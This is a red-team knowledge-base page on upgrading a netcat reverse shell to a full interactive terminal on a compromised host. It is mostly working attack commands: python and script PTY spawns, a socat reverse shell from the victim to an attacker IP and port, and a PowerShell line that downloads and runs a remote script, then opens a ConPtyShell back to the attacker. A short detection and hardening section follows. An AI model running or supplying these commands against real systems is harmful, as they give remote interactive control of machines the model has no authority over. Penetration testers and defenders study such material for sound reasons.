---
title: Upgrading a Dumb Shell to a Full TTY
slug: shell-upgrade-techniques
---

> **TL;DR:** A raw netcat reverse shell breaks on Ctrl-C, tab-complete, and sudo — upgrade to a real PTY before doing anything serious.

## What it is
The reverse shells you catch with `nc -lvnp` are line-buffered pipes, not terminals. Programs like `sudo`, `ssh`, `vi`, and `su` refuse to run, arrow keys print escape codes, and Ctrl-C kills your listener instead of the foreground process. Upgrading allocates a pseudo-terminal on the victim and renegotiates terminal modes with your local terminal so the experience matches a normal SSH session. Every beginner red teamer should make this reflex muscle memory.

## Preconditions / where it applies
- Foothold type: interactive reverse or bind shell (not blind command injection)
- Target OS: Linux with `python`, `python3`, `script`, or `socat` available; Windows requires different tooling
- Egress restrictions: none extra — upgrade is local to the existing channel

## Technique
Classic Linux three-step upgrade:
```bash
# inside the dumb shell
python3 -c 'import pty; pty.spawn("/bin/bash")'
# background with Ctrl-Z, then on attacker:
stty raw -echo; fg
# back inside the shell:
export TERM=xterm-256color
export SHELL=/bin/bash
stty rows 50 columns 200   # match your local terminal
```

Alternatives when python is missing:
```bash
script -qc /bin/bash /dev/null
# or
/usr/bin/expect -c 'spawn /bin/bash; interact'
perl -e 'exec "/bin/bash";'
```

Full-duplex via socat (cleanest, both ends):
```bash
# attacker
socat file:`tty`,raw,echo=0 tcp-listen:4444
# victim
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.10.14.5:4444
```

Quality-of-life: wrap your listener in `rlwrap` for arrow-key history before upgrade:
```bash
rlwrap nc -lvnp 4444
```

Windows equivalent — ConPtyShell gives a real PTY over TCP:
```powershell
IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.5/Invoke-ConPtyShell.ps1')
Invoke-ConPtyShell 10.10.14.5 4444 -Rows 50 -Cols 200
```

## Detection and defence
- Process signals: `python -c 'import pty'`, `script -qc`, `socat` with `pty` options spawned by web service accounts
- Behavioural: short-lived shell processes followed by long-lived PTY children of `nginx`/`apache`/`tomcat`
- Hardening: remove unnecessary interpreters from web tier images, restrict `socat`/`python` via AppArmor or SELinux, alert on PTY allocation by non-login users

## References
- [ropnop — Upgrading Simple Shells to Fully Interactive TTYs](https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/) — the canonical writeup
- [ConPtyShell](https://github.com/antonioCoco/ConPtyShell) — Windows fully interactive shell

See also: [[file-transfer-techniques]], [[living-off-the-land]], [[pivoting-and-tunneling]].
